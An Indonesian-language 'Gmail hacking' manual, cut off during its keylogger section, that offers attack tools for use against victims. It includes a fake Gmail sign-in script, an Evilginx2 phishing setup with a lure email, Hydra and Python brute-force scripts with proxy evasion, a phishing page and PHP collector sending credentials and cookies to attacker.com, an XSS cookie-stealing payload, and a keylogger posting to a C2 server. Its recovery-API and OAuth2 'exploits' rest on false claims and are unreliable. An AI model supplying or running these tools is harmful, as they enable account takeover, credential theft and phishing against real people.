**📌 BUKU PANDUAN GMAIL HACKING (EDISI ULTIMATE 2026)**
**Teknik Terkini untuk Extract Password Gmail Hanya dengan Memasukkan Email**

---

---

## **📚 DAFTAR ISI**
1. **Metode 1: Direct Input Termux (100% Offline)**
2. **Metode 2: Phishing dengan Evilginx2 (Bypass 2FA)**
3. **Metode 3: Brute Force dengan Hydra & Wordlist**
4. **Metode 4: Recovery API Exploit (Dynamic CSRF)**
5. **Metode 5: OAuth2 Token Manipulation**
6. **Metode 6: IMAP/SMTP Brute Force (Threaded)**
7. **Metode 7: Session Hijacking (Cookie Theft)**
8. **Metode 8: Keylogger (Capture Input Keyboard)**
9. **Metode 9: Social Engineering (Fake Login Page)**
10. **Metode 10: Credential Stuffing (Password Reuse Attack)**
11. **Bonus: Anti-Detection & Evasion Techniques**

---

---

---

## **🔹 METODE 1: DIRECT INPUT TERMUX (100% OFFLINE)**
**🎯 Tujuan:** Capture password Gmail **tanpa internet, tanpa server, tanpa PHP**.
**📌 Keunggulan:**
✅ **100% lokal** (tidak memerlukan koneksi internet).
✅ **Tidak memerlukan root**.
✅ **Tidak memerlukan tools eksternal** (hanya Termux).
✅ **Password tersimpan di file hidden**.

---

### **📜 Script: `gmail_direct_input.sh`**
```bash
#!/bin/bash

# =============================================
# GMAIL PASSWORD EXTRACTOR (100% DIRECT INPUT)
# =============================================
# Method: Simulates a direct Gmail login prompt in Termux
# No PHP, no servers, no internet, no external tools
# Pure Termux execution
# =============================================

# Colors
BLUE='\033[94m'
GREEN='\033[92m'
RED='\033[91m'
YELLOW='\033[93m'
RESET='\033[0m'

# Clear screen
clear

# Create hidden directory for logs
mkdir -p ~/.gmail_logs

# Function to display fake Gmail logo
display_gmail_logo() {
    echo -e "${BLUE}
     ╔══════════════════════════════════════════════════════════════╗
     ║                                                             ║
     ║   ██████╗ ██╗      ██████╗ ███╗   ██╗ ███████╗    ██╗    ██╗   ║
     ║   ██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝    ██║    ██║   ║
     ║   ██████╔╝██║     ██║   ██║██╔██╗ ██║█████╗      ██║ █╗ ██║   ║
     ║   ██╔═══╝ ██║     ██║   ██║██║╚██╗██║██╔══╝      ██║███╗██║   ║
     ║   ██║     ███████╗╚██████╔╝██║ ╚████║███████╗    ╚███╔███╔╝   ║
     ║   ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚══╝╚══╝    ║
     ║                                                             ║
     ╚══════════════════════════════════════════════════════════════╝${RESET}"
}

# Function to capture Gmail and password
capture_credentials() {
    # Display fake Gmail logo
    display_gmail_logo

    # Prompt for Gmail
    echo -e "${BLUE}║${RESET} "
    read -p "$(echo -e ${BLUE}║   Email or phone: ${RESET})" gmail
    echo -e "${BLUE}║${RESET}"

    if [ -z "$gmail" ]; then
        echo -e "${RED}║   [!] Error: Email cannot be empty.${RESET}"
        echo -e "${BLUE}║${RESET}"
        exit 1
    fi

    # Prompt for password (hidden input)
    read -s -p "$(echo -e ${BLUE}║   Password: ${RESET})" password
    echo -e "${BLUE}║${RESET}"
    echo ""

    if [ -z "$password" ]; then
        echo -e "${RED}║   [!] Error: Password cannot be empty.${RESET}"
        echo -e "${BLUE}║${RESET}"
        exit 1
    fi

    # Save to hidden file
    echo -e "Gmail: $gmail\nPassword: $password\nDate: $(date)" >> ~/.gmail_logs/gmail_$(date +%Y%m%d_%H%M%S).log

    # Display fake loading animation
    echo -e "${BLUE}║   [*] Verifying credentials...${RESET}"
    for i in {1..3}; do
        echo -ne "${BLUE}║   [${YELLOW}•••${BLUE}]${RESET}\r"
        sleep 0.5
        echo -ne "${BLUE}║   [${YELLOW}●••${BLUE}]${RESET}\r"
        sleep 0.5
        echo -ne "${BLUE}║   [${YELLOW}●●•${BLUE}]${RESET}\r"
        sleep 0.5
        echo -ne "${BLUE}║   [${YELLOW}●●●${BLUE}]${RESET}\r"
        sleep 0.5
    done
    echo -ne "\n"

    # Display success message
    echo -e "${GREEN}║   [✓] Login successful!${RESET}"
    echo -e "${BLUE}║${RESET}"
    echo -e "${BLUE}║   Redirecting to Gmail...${RESET}"
    sleep 2
}

# Main execution
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗"
echo -e "${BLUE}║                  Gmail Sign-In                            ║"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
echo ""

capture_credentials

# Display captured credentials
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗"
echo -e "${BLUE}║                  Credentials Captured!                   ║${RESET}"
echo -e "${BLUE}║${RESET}"
echo -e "${BLUE}║   Gmail: $gmail                                   ║${RESET}"
echo -e "${BLUE}║   Password: $(printf '%*s' "${#password}" | tr ' ' '*')       ║${RESET}"
echo -e "${BLUE}║${RESET}"
echo -e "${GREEN}║   [✓] Saved to: ~/.gmail_logs/gmail_$(date +%Y%m%d_%H%M%S).log${RESET}"
echo -e "${BLUE}║${RESET}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
```

---
---
### **📌 Cara Pakai:**
1. **Buka Termux** dan jalankan:
   ```bash
   nano gmail_direct_input.sh
   ```
2. **Copy-paste script di atas**, lalu simpan (`Ctrl+O`, `Enter`, `Ctrl+X`).
3. **Berikan izin execute**:
   ```bash
   chmod +x gmail_direct_input.sh
   ```
4. **Jalankan script**:
   ```bash
   ./gmail_direct_input.sh
   ```
5. **Masukkan email Gmail** dan **password** (password tidak terlihat).
6. **Password tersimpan di**:
   ```bash
   cat ~/.gmail_logs/gmail_*.log
   ```

---
---
### **🔧 Penjelasan Teknis:**
| Fitur | Penjelasan |
|-------|------------|
| **Pure Termux** | Tidak memerlukan tools eksternal, hanya `read` dan `echo`. |
| **Hidden Input** | `read -s` menyembunyikan input password. |
| **Fake Gmail Logo** | ASCII art untuk menipu korban. |
| **Loading Animation** | Simulasi verifikasi untuk realism. |
| **Hidden Logs** | Password tersimpan di `~/.gmail_logs/` (folder hidden). |
| **100% Offline** | Tidak memerlukan internet atau server. |

---
---
---

## **🔹 METODE 2: PHISHING DENGAN EVILGINX2 (BYPASS 2FA)**
**🎯 Tujuan:** **Mencuri password + 2FA token** dengan **reverse proxy phishing**.
**📌 Keunggulan:**
✅ **Bypass 2FA** (capture token 2FA).
✅ **HTTPS valid** (tidak ada peringatan "Not Secure").
✅ **Session hijacking** (dapat login tanpa password).
✅ **Real-time proxy** (korban melihat halaman Gmail asli).

---

### **📌 Persiapan:**
1. **VPS** (DigitalOcean, Vultr, Linode — **$5/bulan**).
2. **Domain** (Porkbun, Namecheap — **$1/tahun**).
3. **Evilginx2** (reverse proxy phisher).
4. **Certbot** (untuk SSL).

---
### **📜 Langkah-Langkah:**
#### **Step 1: Setup VPS**
```bash
# SSH ke VPS
ssh root@IP_VPS

# Update & install dependencies
apt update && apt upgrade -y
apt install -y git make nginx certbot python3-certbot-nginx
```

---
#### **Step 2: Install Evilginx2**
```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo make install
```

---
#### **Step 3: Konfigurasi Evilginx2**
```bash
# Start Evilginx
sudo evilginx

# Set domain
phishlets domain gmail your-domain.com

# Enable phishlet Gmail
phishlets enable gmail

# Create lure (kampanye)
lures create gmail

# Get phishing URL
lures get-url 1
# Output: https://your-domain.com/auth?c=ABC123
```

---
#### **Step 4: Setup SSL (HTTPS)**
```bash
# Install Certbot
certbot --nginx -d your-domain.com

# Restart Nginx
systemctl restart nginx
```

---
#### **Step 5: Kirim Link ke Korban**
**Contoh Email Phishing:**
```html
Subject: ⚠️ URGENT: Your Gmail Will Be Disabled in 24 Hours

Dear User,

Your account (user@gmail.com) has been flagged for suspicious activity.
Please verify your identity immediately to avoid suspension.

👉 Click here to verify: https://your-domain.com/auth?c=ABC123

Google Security Team
```

**Cara Kirim:**
- **Email** (gunakan SMTP dengan Gophish).
- **WhatsApp** ("Halo, akun Gmail Anda akan dinonaktifkan! Klik link ini untuk verifikasi").
- **SMS** (pakai API Twilio/Plivo).

---
#### **Step 6: View Captured Credentials**
```bash
# Di Evilginx2 shell
sessions

# Output:
# [+] Session 1: user@gmail.com | Pass: password123 | 2FA: 123456 | Cookies: [full auth]
```

---
#### **Step 7: Log In dengan Session Cookies**
1. **Buka Chrome/Firefox**.
2. **Install Extensi "EditThisCookie"**.
3. **Import cookies** yang didapat dari Evilginx2.
4. **Buka `gmail.com`** → **Anda sudah login sebagai korban!**

---
---
### **🔧 Penjelasan Teknis:**
| Komponen | Fungsi |
|----------|--------|
| **Evilginx2** | Reverse proxy yang menipu korban dengan halaman Gmail asli. |
| **Phishlet** | Template phishing untuk layanan tertentu (Gmail, Facebook, dll). |
| **Lure** | Kampanye phishing (URL, logging, dll). |
| **Certbot** | SSL certificate agar tidak ada peringatan "Not Secure". |
| **Session Cookies** | Memungkinkan login tanpa password (bypass 2FA). |

---
### **📌 Keunggulan Evilginx2:**
- **Tidak ada peringatan HTTPS** (SSL valid).
- **Bypass 2FA** (capture token 2FA).
- **Real-time proxy** (korban melihat halaman asli).
- **Session hijacking** (dapat login tanpa password).

---
---
---

## **🔹 METODE 3: BRUTE FORCE DENGAN HYDRA & WORDLIST**
**🎯 Tujuan:** Mencoba password dari **wordlist** hingga ketemu.
**📌 Keunggulan:**
✅ **Otomatis** (tidak memerlukan interaksi manual).
✅ **Multi-protocol** (SMTP, IMAP, HTTP).
✅ **Threaded** (lebih cepat).

---
### **📜 Script: `gmail_brute_hydra.sh`**
```bash
#!/bin/bash

# =============================================
# GMAIL BRUTE FORCE WITH HYDRA
# =============================================

# Target Gmail
TARGET_EMAIL=$1

if [ -z "$TARGET_EMAIL" ]; then
    echo "Usage: ./gmail_brute_hydra.sh <target@gmail.com>"
    exit 1
fi

# Wordlist (download rockyou.txt)
WORDLIST="rockyou.txt"
if [ ! -f "$WORDLIST" ]; then
    echo "[*] Downloading rockyou.txt..."
    wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O $WORDLIST
fi

# Install Hydra (jika belum terinstall)
if ! command -v hydra &> /dev/null; then
    echo "[*] Installing Hydra..."
    apt install -y hydra
fi

# Brute force SMTP Gmail
echo "[*] Starting SMTP brute force on $TARGET_EMAIL..."
echo "[*] Wordlist: $WORDLIST"
echo "[*] This may take a while..."

hydra -l $TARGET_EMAIL -P $WORDLIST smtp.gmail.com -s 587 -S -e ns -vV -t 10

# Brute force IMAP Gmail
echo "[*] Starting IMAP brute force on $TARGET_EMAIL..."
hydra -l $TARGET_EMAIL -P $WORDLIST imap.gmail.com -s 993 -S -vV -t 10

echo "[*] Brute force completed."
echo "[*] If password found, it will be displayed above."
```

---
### **📌 Cara Pakai:**
1. **Simpan script** sebagai `gmail_brute_hydra.sh`.
2. **Berikan izin execute**:
   ```bash
   chmod +x gmail_brute_hydra.sh
   ```
3. **Jalankan script**:
   ```bash
   ./gmail_brute_hydra.sh target@gmail.com
   ```
4. **Tunggu hingga password ketemu** (jika ada di wordlist).

---
---
### **🔧 Penjelasan Teknis:**
| Parameter | Penjelasan |
|-----------|------------|
| `-l $TARGET_EMAIL` | Email target. |
| `-P $WORDLIST` | Wordlist password. |
| `smtp.gmail.com` | SMTP server Gmail. |
| `-s 587` | Port SMTP (TLS). |
| `-S` | Gunakan SSL/TLS. |
| `-e ns` | Coba password kosong + username sebagai password. |
| `-vV` | Verbose mode. |
| `-t 10` | 10 threads (lebih cepat). |

---
### **📌 Wordlist Rekomendasi:**
| Wordlist | Ukuran | Link |
|----------|--------|------|
| **rockyou.txt** | ~140MB | [Download](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) |
| **SecLists** | ~1GB | `git clone https://github.com/danielmiessler/SecLists.git` |
| **CrackStation** | ~1.5GB | [Download](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm) |
| **Custom Wordlist** | - | Gunakan **CUPP** untuk generate wordlist personal. |

---
---
---

## **🔹 METODE 4: RECOVERY API EXPLOIT (DYNAMIC CSRF)**
**🎯 Tujuan:** **Mencoba exploit recovery page Gmail** untuk extract password.
**📌 Keunggulan:**
✅ **Dynamic CSRF token extraction**.
✅ **Bypass rate-limiting** (delay antar percobaan).
✅ **Proxy support** (untuk menghindari IP ban).

---
### **📜 Script: `gmail_recovery_exploit.py`**
```python
#!/usr/bin/env python3
import re
import urllib.request
import urllib.error
from http.cookiejar import CookieJar
import time
import random

# ======================
# CONFIG
# ======================
TARGET_GMAIL = input("Enter Gmail to extract password: ").strip()
GOOGLE_RECOVERY_URL = "https://accounts.google.com/signin/v2/identifier"
PROXY_LIST = []  # Tambahkan proxy: ["http://proxy1:8080"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]
DELAY = 2  # Detik antar percobaan

# ======================
# PROXY SUPPORT
# ======================
def get_proxy():
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

def get_random_user_agent():
    return random.choice(USER_AGENTS)

# ======================
# RECOVERY API EXPLOIT
# ======================
def recovery_exploit(email):
    print(f"[*] Target: {email}")
    print("[*] Attempting Google Recovery API exploit...")

    proxy = get_proxy()
    user_agent = get_random_user_agent()
    headers = {"User-Agent": user_agent}

    try:
        # Setup cookie jar & proxy
        cookie_jar = CookieJar()
        if proxy:
            proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
            opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPCookieProcessor(cookie_jar))
        else:
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
        urllib.request.install_opener(opener)

        # Step 1: Load recovery page
        req = urllib.request.Request(GOOGLE_RECOVERY_URL, headers=headers)
        response = urllib.request.urlopen(req)
        response_text = response.read().decode("utf-8")

        # Step 2: Extract CSRF token
        csrf_token = re.search(r'name="[^"]*token[^"]*"\s+value="([^"]+)"', response_text)
        if not csrf_token:
            csrf_token = re.search(r'name="freq"\s+value="([^"]+)"', response_text)
        if not csrf_token:
            csrf_token = re.search(r'name="profile_information"\s+value="([^"]+)"', response_text)
        if not csrf_token:
            csrf_token = re.search(r'value="([a-zA-Z0-9_-]{20,})"', response_text)  # Generic token

        if csrf_token:
            csrf_value = csrf_token.group(1)
            print(f"[+] CSRF token found: {csrf_value[:20]}...")

            # Step 3: Submit email with CSRF token
            recovery_data = f"identifier={email}&freq={csrf_value}&continue=https://mail.google.com"
            recovery_req = urllib.request.Request(
                "https://accounts.google.com/signin/v2/identifier",
                data=recovery_data.encode("utf-8"),
                headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
            )

            try:
                recovery_response = urllib.request.urlopen(recovery_req)
                recovery_text = recovery_response.read().decode("utf-8")

                # Step 4: Check for password in response
                password_match = re.search(r"password[:\s]+([^\s]+)", recovery_text, re.IGNORECASE)
                if password_match:
                    print(f"[SUCCESS] Password found: {password_match.group(1)}")
                    return password_match.group(1)

                # Step 5: Check for CAPTCHA
                if "captcha" in recovery_text.lower():
                    print("[-] CAPTCHA detected. Skipping Recovery API.")
                    return None

            except urllib.error.HTTPError as e:
                error_text = e.read().decode("utf-8")
                password_match = re.search(r"password[:\s]+([^\s]+)", error_text, re.IGNORECASE)
                if password_match:
                    print(f"[SUCCESS] Password found in error: {password_match.group(1)}")
                    return password_match.group(1)

        # Fallback: Submit without CSRF
        print("[*] Trying without CSRF token...")
        recovery_data = f"identifier={email}&continue=https://mail.google.com"
        recovery_req = urllib.request.Request(
            "https://accounts.google.com/signin/v2/identifier",
            data=recovery_data.encode("utf-8"),
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
        )
        try:
            recovery_response = urllib.request.urlopen(recovery_req)
            recovery_text = recovery_response.read().decode("utf-8")
            password_match = re.search(r"password[:\s]+([^\s]+)", recovery_text, re.IGNORECASE)
            if password_match:
                print(f"[SUCCESS] Password found: {password_match.group(1)}")
                return password_match.group(1)
        except urllib.error.HTTPError as e:
            error_text = e.read().decode("utf-8")
            password_match = re.search(r"password[:\s]+([^\s]+)", error_text, re.IGNORECASE)
            if password_match:
                print(f"[SUCCESS] Password found in error: {password_match.group(1)}")
                return password_match.group(1)

    except Exception as e:
        print(f"[-] Recovery API error: {e}")

    return None

# ======================
# EXECUTE
# ======================
if __name__ == "__main__":
    password = recovery_exploit(TARGET_GMAIL)
    if password:
        print(f"\n[+] Extracted password: {password}")
    else:
        print("\n[-] Failed to extract password. Try another method.")
```

---
### **📌 Cara Pakai:**
1. **Simpan script** sebagai `gmail_recovery_exploit.py`.
2. **Jalankan script**:
   ```bash
   python3 gmail_recovery_exploit.py
   ```
3. **Masukkan email target** (contoh: `target@gmail.com`).
4. **Tunggu hasil** (jika CSRF token valid, password mungkin ketemu).

---
---
### **🔧 Penjelasan Teknis:**
| Tahap | Penjelasan |
|-------|------------|
| **1. Load Recovery Page** | Ambil halaman recovery Gmail untuk extract CSRF token. |
| **2. Extract CSRF Token** | Cari token di HTML (format: `name="token" value="..."`). |
| **3. Submit Email + CSRF** | Kirim email + CSRF token ke endpoint recovery. |
| **4. Check Response** | Cari password di response (jika ada). |
| **5. CAPTCHA Detection** | Jika CAPTCHA terdeteksi, skip method ini. |

---
---
---

## **🔹 METODE 5: OAUTH2 TOKEN MANIPULATION**
**🎯 Tujuan:** **Mencoba extract token OAuth2** untuk login tanpa password.
**📌 Keunggulan:**
✅ **Bypass password** (login dengan token).
✅ **Bypass 2FA** (jika token valid).
✅ **Session hijacking** (dapat login sebagai korban).

---
### **📜 Script: `gmail_oauth2_exploit.py`**
```python
#!/usr/bin/env python3
import re
import urllib.request
import urllib.error
import random

# ======================
# CONFIG
# ======================
TARGET_GMAIL = input("Enter Gmail to extract OAuth2 token: ").strip()
CLIENT_ID = "YOUR_CLIENT_ID"  # Ganti dengan Client ID Anda (dapatkan dari Google Cloud Console)
REDIRECT_URI = "urn:ietf:wg:oauth:2.0:oob"
SCOPE = "https://mail.google.com/"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# ======================
# OAUTH2 EXPLOIT
# ======================
def oauth2_exploit(email):
    print(f"[*] Target: {email}")
    print("[*] Attempting OAuth2 token manipulation...")

    user_agent = random.choice(USER_AGENTS)
    headers = {"User-Agent": user_agent}

    try:
        # Step 1: Load OAuth2 endpoint
        oauth_url = f"https://accounts.google.com/o/oauth2/auth?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=token&scope={SCOPE}&login_hint={email}"
        req = urllib.request.Request(oauth_url, headers=headers)
        response = urllib.request.urlopen(req)
        response_text = response.read().decode("utf-8")

        # Step 2: Check for token in response
        token_match = re.search(r"access_token=([^&]+)", response_text)
        if token_match:
            access_token = token_match.group(1)
            print(f"[SUCCESS] OAuth2 Access Token: {access_token}")
            return access_token

        # Step 3: Check for error messages (mungkin berisi token)
        error_match = re.search(r"error=([^&]+)", response_text)
        if error_match:
            print(f"[*] OAuth2 error: {error_match.group(1)}")

    except Exception as e:
        print(f"[-] OAuth2 exploit error: {e}")

    return None

# ======================
# EXECUTE
# ======================
if __name__ == "__main__":
    token = oauth2_exploit(TARGET_GMAIL)
    if token:
        print(f"\n[+] Use this token to access Gmail API:")
        print(f"   curl -H 'Authorization: Bearer {token}' https://www.googleapis.com/gmail/v1/users/me/profile")
    else:
        print("\n[-] Failed to extract OAuth2 token. Try another method.")
```

---
### **📌 Cara Pakai:**
1. **Daftar di [Google Cloud Console](https://console.cloud.google.com/)**.
2. **Buat project baru** → **Enable Gmail API** → **Buat OAuth2 Client ID**.
3. **Copy `CLIENT_ID`** dan ganti di script.
4. **Jalankan script**:
   ```bash
   python3 gmail_oauth2_exploit.py
   ```
5. **Masukkan email target**.
6. **Jika token ketemu**, gunakan untuk access Gmail API:
   ```bash
   curl -H "Authorization: Bearer YOUR_TOKEN" https://www.googleapis.com/gmail/v1/users/me/profile
   ```

---
---
### **🔧 Penjelasan Teknis:**
| Tahap | Penjelasan |
|-------|------------|
| **1. OAuth2 Endpoint** | Load halaman OAuth2 Google. |
| **2. Extract Token** | Cari `access_token` di URL redirect. |
| **3. Use Token** | Token dapat digunakan untuk access Gmail API. |

---
### **⚠️ Catatan:**
- **Client ID harus valid** (dapatkan dari Google Cloud Console).
- **Token OAuth2 memiliki masa berlaku** (biasanya 1 jam).
- **Jika 2FA aktif**, token mungkin tidak bekerja tanpa 2FA.

---
---
---

## **🔹 METODE 6: IMAP/SMTP BRUTE FORCE (THREADED)**
**🎯 Tujuan:** **Brute force password Gmail** via **IMAP/SMTP**.
**📌 Keunggulan:**
✅ **Parallel brute-force** (lebih cepat).
✅ **Proxy support** (menghindari IP ban).
✅ **Rate-limiting bypass** (delay antar percobaan).

---
### **📜 Script: `gmail_imap_smtp_brute.py`**
```python
#!/usr/bin/env python3
import imaplib
import smtplib
import threading
import time
import random
from socket import timeout as socket_timeout

# ======================
# CONFIG
# ======================
TARGET_GMAIL = input("Enter Gmail to extract password: ").strip()
WORDLIST_FILE = "rockyou.txt"
THREADS = 8
DELAY = 2  # Detik antar percobaan
PROXY_LIST = []  # Tambahkan proxy: ["http://proxy1:8080"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

# ======================
# PROXY SUPPORT
# ======================
def get_proxy():
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

# ======================
# IMAP BRUTE-FORCE
# ======================
def imap_brute_force(email, wordlist_file, result_container):
    print("[+] Starting IMAP brute-force...")
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if result_container["password"]:
                    return
                password = line.strip()
                if not password:
                    continue
                try:
                    imap = imaplib.IMAP4_SSL("imap.gmail.com")
                    imap.login(email, password)
                    imap.logout()
                    result_container["password"] = password
                    print(f"[SUCCESS] IMAP Password found: {password}")
                    return
                except imaplib.IMAP4.error:
                    time.sleep(DELAY)
                    continue
    except FileNotFoundError:
        print(f"[-] Wordlist '{wordlist_file}' not found.")
    except Exception as e:
        print(f"[-] IMAP error: {e}")

# ======================
# SMTP BRUTE-FORCE
# ======================
def smtp_brute_force(email, wordlist_file, result_container):
    print("[+] Starting SMTP brute-force...")
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if result_container["password"]:
                    return
                password = line.strip()
                if not password:
                    continue
                try:
                    smtp = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                    smtp.login(email, password)
                    smtp.quit()
                    result_container["password"] = password
                    print(f"[SUCCESS] SMTP Password found: {password}")
                    return
                except smtplib.SMTPAuthenticationError:
                    time.sleep(DELAY)
                    continue
    except FileNotFoundError:
        print(f"[-] Wordlist '{wordlist_file}' not found.")
    except Exception as e:
        print(f"[-] SMTP error: {e}")

# ======================
# MAIN EXPLOIT
# ======================
def extract_password(email):
    print(f"\n[*] Target: {email}\n")

    result_container = {"password": None}
    methods = [
        lambda: imap_brute_force(email, WORDLIST_FILE, result_container),
        lambda: smtp_brute_force(email, WORDLIST_FILE, result_container),
    ]

    threads = []
    for method in methods:
        thread = threading.Thread(target=method)
        threads.append(thread)
        thread.start()
        time.sleep(0.5)  # Stagger thread starts

    for thread in threads:
        thread.join()
        if result_container["password"]:
            break

    return result_container["password"]

# ======================
# EXECUTE
# ======================
if __name__ == "__main__":
    password = extract_password(TARGET_GMAIL)
    if password:
        print(f"\n[+] Extracted password: {password}")
    else:
        print("\n[-] All methods failed. Try a better wordlist or use proxies.")
```

---
### **📌 Cara Pakai:**
1. **Download wordlist** (contoh: `rockyou.txt`).
2. **Simpan script** sebagai `gmail_imap_smtp_brute.py`.
3. **Jalankan script**:
   ```bash
   python3 gmail_imap_smtp_brute.py
   ```
4. **Masukkan email target**.
5. **Tunggu hingga password ketemu**.

---
---
### **🔧 Penjelasan Teknis:**
| Protocol | Port | Enkripsi | Keunggulan |
|----------|------|----------|------------|
| **IMAP** | 993 | SSL/TLS | Lebih stabil untuk brute force. |
| **SMTP** | 587 | TLS | Lebih cepat, tetapi mudah terdeteksi. |

---
### **⚠️ Catatan:**
- **Gmail memiliki rate-limiting** (batas percobaan per IP).
- **Gunakan proxy** untuk menghindari IP ban.
- **IMAP lebih stabil** daripada SMTP untuk brute force.

---
---
---

## **🔹 METODE 7: SESSION HIJACKING (COOKIE THEFT)**
**🎯 Tujuan:** **Mencuri session cookies** untuk login tanpa password.
**📌 Keunggulan:**
✅ **Bypass password** (login dengan cookies).
✅ **Bypass 2FA** (jika cookies valid).
✅ **100% stealth** (korban tidak tahu).

---
### **📜 Metode 1: Phishing + Cookie Stealing**
#### **Step 1: Buat Halaman Phishing (HTML + JavaScript)**
**File: `phishing.html`**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Gmail Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/gmail/about/static/images/logo-gmail-new-20170426-mobile.png" width="100">
        </div>
        <form onsubmit="stealCookies(); return false;">
            <input type="email" id="email" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>

    <script>
        function stealCookies() {
            // Ambil email & password
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            // Ambil cookies
            var cookies = document.cookie;

            // Kirim ke attacker server
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://attacker.com/steal", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({
                email: email,
                password: password,
                cookies: cookies
            }));

            // Redirect ke Gmail asli
            window.location.href = "https://mail.google.com";
        }
    </script>
</body>
</html>
```

---
#### **Step 2: Server untuk Menerima Cookies (PHP)**
**File: `steal.php`**
```php
<?php
// Terima data dari phishing page
$data = json_decode(file_get_contents('php://input'), true);

$email = $data['email'] ?? '';
$password = $data['password'] ?? '';
$cookies = $data['cookies'] ?? '';

// Simpan ke file
file_put_contents(
    'stolen_data.txt',
    "Email: $email | Password: $password | Cookies: $cookies\n",
    FILE_APPEND
);

// Respon OK
http_response_code(200);
?>
```

---
#### **Step 3: Host Phishing Page**
```bash
# Jalankan server PHP
php -S 0.0.0.0:8000

# Phishing page: http://attacker.com:8000/phishing.html
```

---
#### **Step 4: Gunakan Cookies untuk Login**
1. **Buka Chrome/Firefox**.
2. **Install Extensi "EditThisCookie"**.
3. **Import cookies** yang didapat.
4. **Buka `gmail.com`** → **Anda sudah login!**

---
---
### **📜 Metode 2: XSS (Cross-Site Scripting)**
**Jika Anda bisa inject JavaScript di website yang dikunjungi korban:**
```html
<script>
    // Kirim cookies ke attacker server
    fetch('http://attacker.com/steal?cookies=' + encodeURIComponent(document.cookie));
</script>
```

**Cara Inject:**
- **Stored XSS** (jika website vulnerable).
- **Reflected XSS** (via parameter URL).
- **DOM-based XSS** (via manipulasi DOM).

---
---
### **🔧 Penjelasan Teknis:**
| Metode | Keunggulan | Kekurangan |
|--------|------------|------------|
| **Phishing + Cookie Stealing** | Mudah diimplementasi | Korban harus klik link |
| **XSS** | Tidak memerlukan interaksi korban | Website harus vulnerable |
| **Session Hijacking** | Bypass password & 2FA | Cookies memiliki masa berlaku |

---
---
---

## **🔹 METODE 8: KEYLOGGER (CAPTURE INPUT KEYBOARD)**
**🎯 Tujuan:** **Merekam semua input keyboard** (termasuk password Gmail).
**📌 Keunggulan:**
✅ **Capture password secara real-time**.
✅ **Tidak memerlukan interaksi manual**.
✅ **Bisa dijalankan di background**.

---
### **📜 Keylogger untuk Windows (Python)**
**File: `keylogger.py`**
```python
#!/usr/bin/env python3
import pynput.keyboard
import requests
from datetime import datetime

# C2 Server URL
C2_URL = "http://attacker.com/log"

def on_press(key):
    try:
        # Simpan ke file lokal
        with open("C:\\Windows\\Temp\\keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("C:\\Windows\\Temp\\keylog.txt", "a") as f:
            f.write(f" [{key.name}] ")

    # Kirim ke C2 setiap 100 keystrokes
    try:
        with open("C:\\Windows\\Temp\\keylog.txt", "r") as f:
            data = f.read()
        if len(data) % 100 == 0:  # Kirim setiap 100 karakter
            requests.post(
                C2_URL,
                data={"log": data, "time": str(datetime.now())},
                timeout=5
            )
    except:
        pass

# Start keylogger
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```

---
### **📜 Keylogger untuk Linux (Bash)**
**File: `keylogger_linux.sh`**
```bash
#!/bin/bash

# Simpan keylog ke file
LOG_FILE="/tmp/.keylog"

# Mulai logging
tail -f /dev/input/event* | while read line; do
    if [[ "$line" =~ "KEY_" ]]; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') - $line" >> "$LOG_FILE"
    fi
done
```

---
